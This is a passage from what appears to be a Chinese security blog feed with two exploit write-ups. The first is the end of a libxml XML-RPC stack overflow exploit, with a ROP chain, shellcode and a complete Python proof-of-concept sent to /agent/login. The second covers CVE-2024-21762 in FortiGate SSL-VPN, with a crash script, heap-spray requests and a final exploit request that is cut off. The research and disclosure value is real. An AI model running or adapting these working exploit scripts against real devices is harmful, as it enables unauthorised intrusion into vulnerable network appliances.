+<p>在解决了gadgets问题后，重新搜索合适的指令，通过分析下面的大部分抬栈指令都是可以用的：</p>
+<figure data-type="image" tabindex="20"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628130045725.png?x-oss-process=style/zip" alt="image-20240628130045725" loading="lazy"></figure>
+<p>因为要当作标签传入<code>XML</code>，这里选择了</p>
+<pre><code>0x000000000041464d : ret 0x90be
+</code></pre>
+<p><code>0x41464d</code>转为字符串是<code>AFM</code>，因为这是一个小端系统，最后应该是<code>MFA</code></p>
+<h3 id="rop-链编写">ROP 链编写</h3>
+<p>这里看了一下，栈地址空间是有执行权限的</p>
+<pre><code>gdb-peda$ xinfo 0x7ffc167d5000
+0x7ffc167d5000 --&gt; 0x0 
+Virtual memory mapping:
+Start : 0x00007ffc167d5000
+End   : 0x00007ffc167f5000
+Offset: 0x0
+Perm  : rwxp
+Name  : [stack]
+</code></pre>
+<p>接下来写ROP 利用链就是要计算出当前堆栈的地址，并进行 jmp 跳转执行上面的 shellcode</p>
+<h4 id="抬栈找到-rop-链">抬栈找到 ROP 链</h4>
+<p>通过 <code>ret 0x90be</code>，操作将 esp 增加 <code>25328</code> 个字节，我们只需将 ROP 链放在这个位置即可，为了准确在这个位置，我们需要控制  <code>&lt;BBBBXNA&gt;</code>  的重复次数。经过简单的计算，重复 <code>2376</code> 次加上两个字节，在经过 <code>libxml</code> 剩下代码的操作就可以顺利到达可控的 ROP 区域。</p>
+<figure data-type="image" tabindex="21"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628144024827.png?x-oss-process=style/zip" alt="image-20240628144024827" loading="lazy"></figure>
+<p>这里发现单纯多加一个A不行</p>
+<figure data-type="image" tabindex="22"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628144301076.png?x-oss-process=style/zip" alt="image-20240628144301076" loading="lazy"></figure>
+<p>可以成功跳转</p>
+<figure data-type="image" tabindex="23"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240627165600396.png?x-oss-process=style/zip" alt="image-20240627165600396" loading="lazy"></figure>
+<h4 id="执行-libxml-中的代码">执行 libxml 中的代码</h4>
+<p>执行完 <code>ret</code> 操作后，会继续执行 libxml2.so 中的代码，该部分代码同样也会对栈空间进行操作，需要考虑偏移</p>
+<pre><code>0x7f37bfee24a4:	add    rsp,0x20
+0x7f37bfee24a8:	mov    ecx,DWORD PTR [rsp+0x3c]
+0x7f37bfee24ac:	test   ecx,ecx
+0x7f37bfee24ae:	jne    0x7f37bfee26bb
+0x7f37bfee24b4:	mov    rax,QWORD PTR [rsp+0x10]
+0x7f37bfee24b9:	add    rsp,0x88
+0x7f37bfee24c0:	pop    rbx
+0x7f37bfee24c1:	pop    rbp
+0x7f37bfee24c2:	pop    r12
+0x7f37bfee24c4:	pop    r13
+0x7f37bfee24c6:	pop    r14
+0x7f37bfee24c8:	pop    r15
+0x7f37bfee24ca:	ret
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628184340965.png?x-oss-process=style/zip" alt="image-20240628184340965" loading="lazy"></figure>
+<h4 id="构造-rop-链">构造 ROP 链</h4>
+<p>使用p64</p>
+<figure data-type="image" tabindex="25"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240701173603401.png?x-oss-process=style/zip" alt="image-20240701173603401" loading="lazy"></figure>
+<pre><code>从堆栈中弹出 2 个字节并跳转
+0x40f968:	ret    0x2
+
+跳到下一个gadget
+0x405020:	ret
+
+将位于 0x41d611 的gadget弹出到 rax 中。
+0x41d60e:	pop    rax
+0x41d60f:	pop    rbx
+0x41d610:	pop    rbp
+0x41d611:	ret
+
+将栈指针保存在rbp中，然后调用之前弹出到rax中的gadget。
+0x405e7d:	mov    rbp,rsp
+0x405e80:	call   rax
+
+从栈中移除两个值
+0x41d5b1:	pop    rsi
+0x41d5b2:	pop    r15
+0x41d5b4:	ret
+
+将包含栈针的rbp推到栈上
+0x405e7c:	push   rbp
+0x405e7d:	mov    rbp,rsp
+0x405e80:	call   rax
+
+从栈中移除两个值
+0x41d5b1:	pop    rsi
+0x41d5b2:	pop    r15
+0x41d5b4:	ret
+
+把之前推的栈址加载到rdx里，并把它复制到rsi
+0x41d2ad:	lea    rdx,[rbp-0x80]
+0x41d2b1:	mov    rsi,rdx
+0x41d2b4:	mov    rdi,rcx
+0x41d2b7:	call   rax
+
+从栈中移除两个值
+0x41d5b1:	pop    rsi
+0x41d5b2:	pop    r15
+0x41d5b4:	ret
+
+0xc0弹到rax，堆栈指针加192字节。
+0x41d60e:	pop    rax
+0x41d60f:	pop    rbx
+0x41d610:	pop    rbp
+0x41d611:	ret
+
+把指向栈的rdx复制到rax，然后跳转。
+0x40a92a:	add    rax,rdx
+0x40a92d:	jmp    rax
+
+执行shellcode。
+0x7ffd5782ca68:	nop
+</code></pre>
+<figure data-type="image" tabindex="26"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628184601732.png?x-oss-process=style/zip" alt="image-20240628184601732" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240628184655166.png?x-oss-process=style/zip" alt="image-20240628184655166" loading="lazy"></figure>
+<p>看到一种比较不同的漏洞利用验证方法，不是传统的<code>getshell</code>验证，学习了一下</p>
+<p>它的目标是：</p>
+<ul>
+<li>相对无侵入性，最小化系统更改，做到更隐蔽</li>
+<li>一致性，即要求可重复、稳定、可靠</li>
+<li>不依赖回调基础设施，即尽量不传数据到自己的机器上</li>
+</ul>
+<p>网上比较常见的并且在这个漏洞中也有其他人使用的方法是向磁盘写文件，并抛出一个反向 shell，针对这个情况，它的想法是：</p>
+<ul>
+<li>本来的漏洞利用即是通过 HTTP 请求来进行的</li>
+<li>如果能够劫持HTTP响应，并且写入一个唯一值</li>
+<li>最后成功在响应中检测到该唯一值，就可以确认漏洞利用成功。</li>
+</ul>
+<h3 id="劫持响应">劫持响应</h3>
+<p>首先是想利用<code>strace</code>，这个工具能够允许用户查看进程的系统调用、信号传递和进程间通信。</p>
+<p>因为没找到直接编译好的静态文件，编译又相对繁琐，我尝试编译了一下，架构不同没能成功，需要对应架构的虚拟机编译，这个有点麻烦，直接找了网上现有的响应分析</p>
+<pre><code>write(9, &quot;\1\6\0\1\1]\3\0Content-type: text/xml\r\n\r\n&lt;?xml version=\&quot;1.0\&quot;?&gt;\n&lt;methodResponse&gt;\n &lt;fault&gt;&lt;value&gt;&lt;struct&gt;\n  &lt;member&gt;\n   &lt;name&gt;faultCode&lt;/name&gt;\n   &lt;value&gt;&lt;int&gt;401&lt;/int&gt;&lt;/value&gt;\n  &lt;/member&gt;\n  &lt;member&gt;\n   &lt;name&gt;faultString&lt;/name&gt;\n   &lt;value&gt;&lt;string&gt;invalid credentials or user doesn&amp;apos;t exist&lt;/string&gt;&lt;/value&gt;\n  &lt;/member&gt;\n &lt;/struct&gt;&lt;/value&gt;&lt;/fault&gt;\n&lt;/methodResponse&gt;\n\0\0\0&quot;, 360) = 360
+
+write(9, &quot;\1\6\0\1\0\0\0\0\1\3\0\1\0\10\0\0\0\0\0\0\0\0\0\0&quot;, 24) = 24
+</code></pre>
+<p>观察到响应的格式基本相同，都是一些二进制数据加一些<code>HTML</code>，通过文件描述符9写入</p>
+<p>并且由于这个进程使用<code>FCGI</code>，上面的数据同<code>FCGI</code>的一个响应结构很符合</p>
+<pre><code>typedef struct {
+   unsigned char version;                    // 0x01
+   unsigned char type;                       // 0x06 (FCGI_STDOUT)
+   unsigned char requestIdB1;                // 0x00
+   unsigned char requestIdB0;                // 0x01
+   unsigned char contentLengthB1;            // 0x01
+   unsigned char contentLengthB0;            // ]
+   unsigned char paddingLength;              // 0x03
+   unsigned char reserved;                   // 0x00
+   unsigned char contentData[contentLength]; // Content-type: text/xml...
+   unsigned char paddingData[paddingLength]; // 0x000000
+} FCGI_Record;
+</code></pre>
+<p>下面的工作就是写<code>shellcode</code>来执行<code>syscall</code>，通过它写一个测试值</p>
+<h3 id="shellcode">shellcode</h3>
+<pre><code>mov    rdx,0x30     ; 字符串长度
+mov    rsi,rsp      ；write 系统调用的第二个参数，把当前栈指针 rsp 的值赋给寄存器 rsi
+add    rsi,0x38     ; 指向准备好的FastCGI 记录的起始位置
+mov    rdi,0x9      ;  write 系统调用第一个参数
+mov    rax,0x1      ;  write 系统调用号
+syscall
+mov    rax,0x3c     ; exit系统调用号
+mov    rdi,0x0      ; exit 系统调用第一个参数
+syscall
+</code></pre>
+<p>完整poc</p>
+<pre><code>#!/usr/bin/env python3
+
+import socket
+import ssl
+import gzip
+import sys
+
+def build_payload():
+    # xml overflow payload
+    payload  = b''
+    payload += b'&lt;methodCall&gt;&lt;methodName&gt;agent.login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;value&gt;&lt;'
+    payload += b'A'*3181
+    payload += b'MFA&gt;'
+    payload += b'&lt;BBBBMFA&gt;'*3680
+
+    # padding and rop chain
+    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 P@\x00\x00\x00\x00\x00h\xf9@\x00\x00\x00\x00\x00 P@\x00\x00\x00\x00\x00\x00\x00\x0e\xd6A\x00\x00\x00\x00\x00\xb1\xd5A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}^@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|^@\x00\x00\x00\x00\x00\xad\xd2A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\xd6A\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00*\xa9@\x00\x00\x00\x00\x00'
+
+    # shell code
+    payload += b'\x48\xC7\xC2\x30\x00\x00\x00'  # mov rdx,0x30
+    payload += b'\x48\x89\xE6'                  # mov rsi,rsp
+    payload += b'\x48\x83\xC6\x2e'              # add rsi,0x2e
+    payload += b'\x48\xC7\xC7\x09\x00\x00\x00'  # mov rdi,0x9
+    payload += b'\x48\xC7\xC0\x01\x00\x00\x00'  # mov rax,0x1 
+    payload += b'\x0f\x05'                      # syscall
+    payload += b'\x48\xc7\xc0\x3c\x00\x00\x00'  # mov rax,0x3c
+    payload += b'\x48\xc7\xc7\x00\x00\x00\x00'  # mov rdi,0x0
+    payload += b'\x0f\x05'                      # syscall
+
+    # http response
+    payload += b'\x01'      # fcgi version
+    payload += b'\x06'      # fcgi type (stdout)
+    payload += b'\x00\x01'  # fcgi request id
+    payload += b'\x00\x3c'  # content length
+    payload += b'\x00'      # padding length
+    payload += b'\x00'      # reserved
+    payload += b'Content-Type: text/plain\r\n\r\nPewPewPewPew'
+
+    return gzip.compress(payload, 9)
+
+def build_post_request(target):
+    payload = build_payload()
+
+    request  = ''
+    request += 'POST /agent/login HTTP/1.1\r\n'
+    request += 'Host: {}:8080\r\n'.format(target)
+    request += 'Content-Encoding: gzip\r\n'
+    request += 'Content-Length: {}\r\n'.format(len(payload))
+    request += '\r\n'
+
+    return request.encode() + payload
+
+if __name__ == '__main__':
+    TARGET = sys.argv[1]
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ssl_sock = ssl.wrap_socket(sock=sock, cert_reqs=ssl.CERT_NONE)
+
+    print('connecting to {} port {}'.format(TARGET, 8080))
+    ssl_sock.connect((TARGET, 8080))
+
+    print ('发送 payload...')
+    request = build_post_request(TARGET)
+    ssl_sock.send(request)
+
+    print('收到...')
+    print(ssl_sock.recv())
+</code></pre>
+<p>可以看到也是成功了</p>
+<figure data-type="image" tabindex="28"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240704140518607.png?x-oss-process=style/zip" alt="image-20240704140518607" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2024-21762 FortiGate]]></title>
+        <id>https://blog.augustu.top/post/cve-2024-21762-fortigate/</id>
+        <link href="https://blog.augustu.top/post/cve-2024-21762-fortigate/">
+        </link>
+        <updated>2024-06-20T03:03:42.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="静态分析">静态分析</h3>
+<p>这是一个越界写入漏洞，根据前期调研，可以用chunk length字段传入很多个0，0的长度大于剩余缓冲区长度的1/2时，就会触发越界写入</p>
+<p>找到漏洞位置</p>
+<figure data-type="image" tabindex="1"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517145406131.png?x-oss-process=style/zip" alt="image-20240517145406131" loading="lazy"></figure>
+<p>这里与修复后版本进行对比，发现主要有两个修改点</p>
+<figure data-type="image" tabindex="2"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240620110653034.png?x-oss-process=style/zip" alt="image-20240620110653034" loading="lazy"></figure>
+<ul>
+<li>解析chunk格式时，，检查分块长度是否大于16，大于16认为是非法的chunk length。</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240620110717764.png?x-oss-process=style/zip" alt="image-20240620110717764" loading="lazy"></figure>
+<ul>
+<li>
+<p>读取chunk trailer（数据传输结束标志，大小为0的块）时，写入<code>\r\n</code>的偏移<code>line_off</code>的赋值来源</p>
+<p>修复前<code>line_off</code>的值来源于<code>*(_QWORD *)(a1 + 744)</code>，修复后<code>line_off</code>为<code>ap_getline</code>的返回值。</p>
+</li>
+</ul>
+<p>对具体代码进行分析</p>
+<pre><code>if ( ap_getline(*(a1 + 760), v26, *(*(a1 + 8) + 40LL), 1LL) &lt;= 0 )
+              {
+                if ( sub_16DCA50(*(*(a1 + 8) + 40LL)) - 1 &lt;= 4 )
+                  return -1LL;
+                break;
+              }
+</code></pre>
+<p>这里先用<code>ap_getline</code>检查<code>chunk</code>长度，如果≤0，会继续检查，不通过会返回-1，结束</p>
+<p><code>sub_16DCA50</code>简单分析了一下，根据动调一般不会有什么影响，大概是检查偏移 160 字节处的值，并将其转换和处理后返回（整数右移 3 位后，转换为 16 位整数，再转换为无符号 32 位整数）。如果传入的指针无效（即 <code>a1</code> 为零），则返回一个特殊值（<code>4294967292LL</code>）</p>
+<p>在检查结束以后，有一段代码</p>
+<pre><code>v27 = *(_DWORD *)(a1 + 752);  // 获取当前chunk剩余字节数
+line_off = *(_QWORD *)(a1 + 728);  // 当前行的偏移
+v29 = v27 - 1;  // 减去1字节，可能用于处理行末的CRLF
+if ( line_off != v29 )
+{
+  v30 = *(_QWORD *)(a1 + 760);  // 缓冲区起始地址
+  *(_QWORD *)(a1 + 728) = line_off + 1;
+  *(_BYTE *)(v30 + line_off) = 13;  // 写入0x0d (CR)
+  v31 = *(_QWORD *)(a1 + 728);  // 更新偏移
+  v32 = *(_QWORD *)(a1 + 760);  // 缓冲区起始地址
+  *(_QWORD *)(a1 + 728) = v31 + 1;
+  *(_BYTE *)(v32 + v31) = 10;  // 写入0x0a (LF)
+  v29 = *(_QWORD *)(a1 + 728);  // 更新偏移
+  v27 = *(_DWORD *)(a1 + 752);  // 更新chunk剩余字节数
+}
+</code></pre>
+<p>大概逻辑为，在读取chunk trailer时，根据chunk length的字段，如果发现当前chunk已经处理完（即<code>v27</code>等于0），会在缓冲区适当位置写入0x0d（CR）和0x0a（LF），表示chunk的结束。</p>
+<figure data-type="image" tabindex="4"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517143444874.png?x-oss-process=style/zip" alt="image-20240517143444874" loading="lazy"></figure>
+<p>总结：</p>
+<ul>
+<li>
+<p>如果chunk length的字段解码后为0的话, 就会从chunk trailer开始读, 而chunk trailer是由ap_getline读取的</p>
+</li>
+<li>
+<p>读取chunk trailer的时候,会根据chunk length的长度写入<code>0x0d,0x0a</code></p>
+</li>
+<li>
+<p>如果在chunk length上传入0的长度大于剩余缓冲区长度的1/2时,就会触发越界写<code>0x0a0d</code></p>
+</li>
+</ul>
+<p>通过栈回溯，查看上级函数，有如下内容</p>
+<pre><code>char v4[8200]; // [rsp+0h] [rbp-2020h] BYREF
+</code></pre>
+<ul>
+<li>
+<p>因为是64位，可知偏移0x2028的位置保存了返回地址</p>
+</li>
+<li>
+<p>如果在0x202e处写入，那么0x2028处保存的返回地址的最后两个字节将会被替换</p>
+</li>
+<li>
+<p>因为大端寻址，原来应该是xxxxxx0d0a，最后应该成功触发溢出，并显示非法地址是0x0d0axxxxxx</p>
+</li>
+</ul>
+<h3 id="触发crash">触发crash</h3>
+<p>用一个简单的脚本触发crash</p>
+<pre><code>import socket
+import ssl
+
+def creat_ssock(hostname, port):
+    context = ssl._create_unverified_context() 
+    sock = socket.create_connection((hostname, port))
+    ssock = context.wrap_socket(sock, server_hostname=hostname)
+    return ssock
+
+hostname = '192.168.150.9' 
+port = 10443
+
+pkt = b&quot;&quot;&quot;\
+GET /  HTTP/1.1
+Host: %s
+Transfer-Encoding: chunked
+
+%s\r\n%s\r\n\r\n&quot;&quot;&quot; % (hostname.encode(), b&quot;0&quot; * ((0x202e // 2) - 2), b&quot;a&quot;)
+
+ssock = creat_ssock(hostname, port)
+ssock.send(pkt)
+
+response = ssock.recv(4096)
+print(response.decode('utf-8'))
+
+ssock.close()
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517162732131.png?x-oss-process=style/zip" alt="image-20240517162732131" loading="lazy"></figure>
+<h3 id="漏洞利用">漏洞利用</h3>
+<h4 id="尝试劫持rbp">尝试劫持rbp</h4>
+<p>通过覆盖rbp的低字节，使rbp刚好指向可控的内存区域</p>
+<ul>
+<li><code>rbp</code>为0x2020，写入0x2026个，则<code>rbp</code>地址最后两个字节会被覆盖为<code>\r\n(0d0a)</code></li>
+</ul>
+<p>但尝试后发现，即使覆盖了栈上的rbp，也无法劫持rsp和rip，甚至程序不会产生崩溃</p>
+<figure data-type="image" tabindex="6"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517165130651.png?x-oss-process=style/zip" alt="image-20240517165130651" loading="lazy"></figure>
+<p>向上回溯，找到<code>sub_17F5AC0</code>的父函数<code>sub_180AA90</code>，该函数在返回时并没有调用<code>leave ret</code>来恢复rsp，而是直接<code>add rsp, 0x18</code>，因此无法达到预期的效果。</p>
+<figure data-type="image" tabindex="7"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517164731199.png?x-oss-process=style/zip" alt="image-20240517164731199" loading="lazy"></figure>
+<h4 id="堆喷方法">堆喷方法</h4>
+<p>但此函数在栈上保存了rbx、r12-r15五个寄存器的值，并在函数返回时恢复这些寄存器，继续回溯，可以看到r13中保存的正是参数<code>a1</code>。</p>
+<figure data-type="image" tabindex="8"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517170331774.png?x-oss-process=style/zip" alt="image-20240517170331774" loading="lazy"></figure>
+<p>a1是一个结构体指针，通过调试也可以看出栈上保存的<code>r13</code>是一个堆地址。</p>
+<figure data-type="image" tabindex="9"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517170725549.png?x-oss-process=style/zip" alt="image-20240517170725549" loading="lazy"></figure>
+<p>​	如果通过越界写覆盖r13最后两个字节，那么<code>sub_180AA90</code>函数返回时恢复r13寄存器，就可以篡改<code>a1</code>指针的值。如果能够对堆内存进行布局，使得a1指向提前布置好的内存区域，那么就可以劫持整个a1结构体。</p>
+<p>​	然后大概看了一下<code>sub_1A27650</code>和<code>sub_1A26040</code>的代码逻辑，感觉a1多级结构体成员的动态函数调用还挺多，这样劫持a1会有更多的利用机会。</p>
+<h3 id="劫持结构体">劫持结构体</h3>
+<h5 id="结构体大小获取">结构体大小获取</h5>
+<p>需要堆喷来调整堆上结构的，所以首先要知道该结构体的大小</p>
+<p>一开始断点下错了，分析了一下调用链</p>
+<h6 id="调用链分析">调用链分析</h6>
+<p>尝试通过栈回溯查看，不能成功在此处下断点</p>
+<figure data-type="image" tabindex="10"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517164731199.png?x-oss-process=style/zip" alt="image-20240517164731199" loading="lazy"></figure>
+<p>找到原因，此处预计判断条件错误，不会走到<code>AB39</code>（最后发现是请求脚本写错了）</p>
+<figure data-type="image" tabindex="11"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240527200536384.png?x-oss-process=style/zip" alt="image-20240527200536384" loading="lazy"></figure>
+<p>调用链：</p>
+<ul>
+<li>180C1B0
+<ul>
+<li>180AA90</li>
+</ul>
+</li>
+</ul>
+<p>从<code>sub_180AA90</code>返回到<code>sub_180C1B0</code>有如下语句</p>
+<pre><code>.text:000000000180C1B0                 mov     edx, 1
+.text:000000000180C1B5                 mov     esi, r14d
+.text:000000000180C1B8                 mov     rdi, r13
+.text:000000000180C1BB                 call    sub_180AA90
+.text:000000000180C1C0                 test    eax, eax
+</code></pre>
+<p>这里重新call了一遍<code>sub_180AA90</code>，并且传入的rdi是从r13来恢复的。该参数对应了一个大结构体。</p>
+<p><code>sub_180AA90</code>在返回时从栈上恢复了r13，且通过动调可以发现r13的初始值位于堆上。</p>
+<pre><code>.text:000000000180AB39 loc_180AB39:                            ; CODE XREF: sub_180AA90+342↓j
+.text:000000000180AB39                                         ; sub_180AA90+36A↓j ...
+.text:000000000180AB39                 add     rsp, 18h
+.text:000000000180AB3D                 pop     rbx
+.text:000000000180AB3E                 pop     r12
+.text:000000000180AB40                 pop     r13
+.text:000000000180AB42                 pop     r14
+.text:000000000180AB44                 pop     r15
+.text:000000000180AB46                 pop     rbp
+.text:000000000180AB47                 retn
+</code></pre>
+<pre><code>.text:000000000180C288 loc_180C288:                            ; CODE XREF: sub_180C240+6D↓j
+.text:000000000180C288                 mov     rdi, r12
+.text:000000000180C28B                 call    sub_181B8E0
+.text:000000000180C290                 mov     rdi, r12
+.text:000000000180C293                 mov     esi, r13d
+.text:000000000180C296                 mov     r12, rbx
+.text:000000000180C299                 call    sub_180C0A0
+.text:000000000180C29E                 mov     rax, [rbx+18h]
+.text:000000000180C2A2                 lea     rbx, [rax-18h]
+.text:000000000180C2A6                 cmp     r12, offset qword_BF042C0
+.text:000000000180C2AD                 jnz     short loc_180C288
+</code></pre>
+<h6 id="查看结构体分配位置">查看结构体分配位置</h6>
+<p>经过观察，可被劫持的<code>r13</code>保存的结构体在不同请求中的分配几乎都在同一个位置，因此可以直接下watch断点来找到它被分配的代码位置。</p>
+<img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240529152353608.png?x-oss-process=style/zip" alt="image-20240529152353608" style="zoom: 33%;" />
+<img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240529152604553.png?x-oss-process=style/zip" alt="image-20240529152604553" style="zoom: 33%;" />
+<pre><code>pwndbg&gt; watch *0x7ff2b8c54800
+Hardware watchpoint 4: *0x7ff2b8c54800
+</code></pre>
+<img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240529153022964.png?x-oss-process=style/zip" alt="image-20240529153022964" style="zoom:67%;" />
+<p>断下来之后查看调用栈，发现是<code>je_calloc</code>开的空间</p>
+<figure data-type="image" tabindex="12"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240529153352802.png?x-oss-process=style/zip" alt="image-20240529153352802" loading="lazy"></figure>
+<p>找到<code>je_calloc@plt</code>调用位置后，下断点查看</p>
+<figure data-type="image" tabindex="13"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240529154643089.png?x-oss-process=style/zip" alt="image-20240529154643089" loading="lazy"></figure>
+<p><code>je_calloc</code>原型如下</p>
+<pre><code>void *je_calloc(size_t nmemb, size_t size);
+</code></pre>
+<p>所以结构体大小是0x730</p>
+<h5 id="尝试布置堆块">尝试布置堆块</h5>
+<p>这里使用了一个GDB脚本在分配大小接近0x730时自动打印对je_malloc和je_calloc的调用</p>
+<pre><code>b je_malloc if (($rdi &gt;= 0x700) &amp;&amp; ($rdi &lt;= 0x800))
+commands
+    silent
+    set $malloc_size = $rdi
+    c
+end
+
+b *(je_malloc+205)
+commands
+    silent
+    if (($malloc_size &gt;= 0x700) &amp;&amp; ($malloc_size &lt;= 0x800))
+        printf &quot;je_malloc: %p : %p : %d\n&quot;, $rax, ($rax + $malloc_size), $malloc_size
+        set $malloc_size = 0
+    end
+    c
+end
+
+b je_calloc if (($rsi &gt;= 0x700) &amp;&amp; ($rsi &lt;= 0x800))
+commands
+    silent
+    set $calloc_size = $rsi
+    c
+end
+
+b *(je_calloc+340)
+commands
+    silent
+    if (($calloc_size &gt;= 0x700) &amp;&amp; ($calloc_size &lt;= 0x800))
+        printf &quot;je_calloc: %p : %p : %d\n&quot;, $rax, ($rax + $calloc_size), $calloc_size
+        set $calloc_size = 0
+    end
+    c
+end
+
+set $malloc_size = 0
+set $calloc_size = 0
+</code></pre>
+<p>只看到一个分配</p>
+<pre><code>je_calloc: 0x7f1ecfc54800 : 0x7f1ecfc54f30 : 1840
+</code></pre>
+<p>从以前的攻击中知道，FortiGate在解析每个表单post参数时会创建单独的分配，所以感觉可以对具体分配控制的细一点，发了一个带五个参数的请求，每个参数长度都为目标分配大小。</p>
+<p>具体脚本</p>
+<pre><code class="language-Python">import socket
+import ssl
+
+def create_ssock(hostname, port):
+    context = ssl._create_unverified_context()
+    sock = socket.create_connection((hostname, port))
+    ssock = context.wrap_socket(sock, server_hostname=hostname)
+    return ssock
+
+hostname = '192.168.150.9'
+port = 10443
+
+# 修改body内容
+body = (b&quot;A&quot; * 1840 + b&quot;=&amp;&quot;) * 5
+
+# 构造POST请求的数据
+data = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.1.229\r\n&quot;
+data += b&quot;Content-Length: &quot; + str(len(body)).encode(&quot;utf-8&quot;) + b&quot;\r\n&quot;
+data += b&quot;\r\n&quot;
+data += body
+
+# 创建SSL套接字并发送数据
+ssock = create_ssock(hostname, port)
+ssock.send(data)
+
+# 接收响应
+response = ssock.recv(4096)
+print(response.decode('utf-8'))
+
+# 关闭套接字
+ssock.close()
+</code></pre>
+<p>结果如下</p>
+<pre><code>je_calloc: 0x7f1ecfc54800 : 0x7f1ecfc54f30 : 1840
+je_malloc: 0x7f1eceff5800 : 0x7f1eceff5f50 : 1872
+je_malloc: 0x7f1ecf016000 : 0x7f1ecf016750 : 1872
+je_malloc: 0x7f1ecf015800 : 0x7f1ecf015f50 : 1872
+je_malloc: 0x7f1ecf01e800 : 0x7f1ecf01ef50 : 1872
+je_malloc: 0x7f1ecefdf800 : 0x7f1ecefdff50 : 1872
+je_malloc: 0x7f1ecf01f800 : 0x7f1ecf01ff50 : 1872
+je_malloc: 0x7f1ecf01d400 : 0x7f1ecf01db50 : 1872
+je_malloc: 0x7f1ecf020800 : 0x7f1ecf020f50 : 1872
+je_malloc: 0x7f1ecf01d800 : 0x7f1ecf01df50 : 1872
+</code></pre>
+<p>malloc跟calloc大小不太一样，增加了32个字节（最后一列为10进制），但根据之前的分析，应该都能够分配大小相同（0x800）并且连续的堆块</p>
+<p>通过以上测试，调整一下大小，最终形成如下两个请求</p>
+<pre><code class="language-Python">import socket
+import ssl
+import time
+
+def create_ssock(hostname, port):
+    context = ssl._create_unverified_context()
+    sock = socket.create_connection((hostname, port))
+    ssock = context.wrap_socket(sock, server_hostname=hostname)
+    return ssock
+
+TARGET = '192.168.150.9'
+PORT = 10443
+ssock1 = create_ssock(TARGET, PORT)
+# 布置堆块
+body = (b&quot;A&quot;*1901 + b&quot;=&quot; + b&quot;B&quot;*1901 + b&quot;&amp;&quot;)*15
+
+data = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.150.9\r\n&quot;
+data += b&quot;Content-Length: &quot; + str(len(body)).encode(&quot;utf-8&quot;) + b&quot;\r\n&quot;
+data += b&quot;\r\n&quot;
+data += body
+
+ssock1.sendall(data)
+
+time.sleep(1)
+ssock2 = create_ssock(TARGET, PORT)
+
+data  = b&quot;POST / HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.1.229\r\n&quot;
+data += b&quot;Transfer-Encoding: chunked\r\n&quot;
+data += b&quot;\r\n&quot;
+data += b&quot;0&quot;*4120 + b&quot;\0&quot;
